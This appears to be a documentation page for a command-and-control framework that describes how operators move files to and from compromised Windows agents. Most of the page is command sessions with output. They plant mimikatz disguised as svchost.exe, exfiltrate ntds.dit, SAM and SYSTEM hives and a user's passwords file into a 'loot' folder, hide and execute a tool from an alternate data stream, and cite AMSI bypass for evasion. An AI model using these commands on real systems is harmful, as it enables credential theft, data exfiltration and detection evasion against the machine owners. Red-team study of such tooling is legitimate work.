# File Operations

Upload files to agents and download files from them. All transfers are encrypted with the session AES-256-GCM key.

---

## Upload (Operator → Agent)

Push a local file to a specific path on the agent machine.

```
❯ files upload a1b2 /home/operator/tools/mimikatz.exe "C:\Windows\Temp\svchost.exe"
[*] Preparing to upload 'mimikatz.exe' to agent 'a1b2c3d4...' at 'C:\Windows\Temp\svchost.exe'
[*] Uploading 'mimikatz.exe' to C2 server...
[+] Upload command queued. Command ID: d4e5f6a7-...
[*] Waiting for upload to complete on agent...
  ◑ executing
[+] Upload completed: C:\Windows\Temp\svchost.exe
[+] File 'mimikatz.exe' uploaded successfully to 'C:\Windows\Temp\svchost.exe'
```

**How it works internally:**
1. Operator CLI reads the local file and base64-encodes it.
2. Sends the encoded payload to the server's upload endpoint.
3. Server stores it in the command queue as an `upload` command.
4. Agent's next beacon receives the command, decodes the file, and writes it to the specified path.
5. Agent submits success/failure result.

**Why rename the file:** Uploading `mimikatz.exe` to `C:\Windows\Temp\svchost.exe` is a trivial name-based evasion. EDR still scans the contents — see the [Evasion](12-evasion.md) wiki for AMSI bypass before running known tools.

---

## Download (Agent → Operator)

Pull a file from the agent machine to the operator's local system.

```
❯ files download a1b2 "C:\Windows\NTDS\ntds.dit" /home/operator/loot/ntds.dit
[*] Requesting download of 'C:\Windows\NTDS\ntds.dit' from agent 'a1b2c3d4...'
[+] Download command queued. Command ID: e5f6a7b8-...
[*] Waiting for download to complete...
  ◐ executing
[+] Download completed.
[+] File is now on the C2 server. Retrieve from server path '/home/operator/loot/ntds.dit'.
```

**How it works internally:**
1. Server queues a `download` command with the remote file path.
2. Agent reads the file, base64-encodes it, and submits it as the command result.
3. Server decodes and saves it to the operator-specified local path on the server machine.
4. CLI reports success.

**Note:** The file lands on the server machine, not the operator's local machine if they differ. If operating remotely (operator → server → agent), retrieve the file from the server separately (e.g., SCP).

---

## Asynchronous Transfers

For large files or slow beacon intervals:

```
# Queue the download without waiting
❯ files download a1b2 "C:\Users\jsmith\Documents\passwords.xlsx" /loot/passwords.xlsx --no-wait
[+] Download command queued. Command ID: f6a7b8c9-...
[*] Check status with: taburtuai status f6a7b8c9-...

# Check later
❯ status f6a7b8c9
Status: completed
[+] File downloaded successfully.
```

---

## Practical Scenarios

### Uploading a Tool Without Touching Disk

Combine upload with the ADS (Alternate Data Stream) feature to hide a tool in a legitimate file's alternate stream:

```
# Upload tool into an ADS on a legitimate file
❯ ads write a1b2 /home/operator/tools/tool.exe "C:\Windows\notepad.exe:helpdata"

# Execute from the ADS
❯ ads exec a1b2 "C:\Windows\notepad.exe:helpdata"
```

### Exfiltrating the SAM Database

```
# First, dump SAM hives to temp
❯ creds sam a1b2

# Download the dumped hive files
❯ files download a1b2 "C:\Windows\Temp\sam_dump\SAM" /loot/SAM
❯ files download a1b2 "C:\Windows\Temp\sam_dump\SYSTEM" /loot/SYSTEM
```

### Uploading a PowerShell Script and Running It

```
❯ files upload a1b2 /home/op/scripts/enum.ps1 "C:\Windows\Temp\init.ps1"
❯ cmd a1b2 "powershell -NonInteractive -File C:\Windows\Temp\init.ps1"
```

---

## Size Limits and Performance

| File Size | Behavior |
|-----------|---------|
| < 10 MB | Standard path, completes in 1–2 beacon cycles |
| 10–100 MB | Large file path (server limit 100 MB), may take multiple cycles |
| > 100 MB | Split the file before transferring or use an alternative exfil channel |

Transfer speed depends entirely on beacon interval. A 30-second beacon with a 10 MB file takes roughly 60 seconds total (one cycle to queue, one to execute).

For large files during a time-sensitive engagement, reduce the agent's beacon interval temporarily:

```
❯ cmd a1b2 "sleep 5"   # if the agent supports runtime sleep update
```
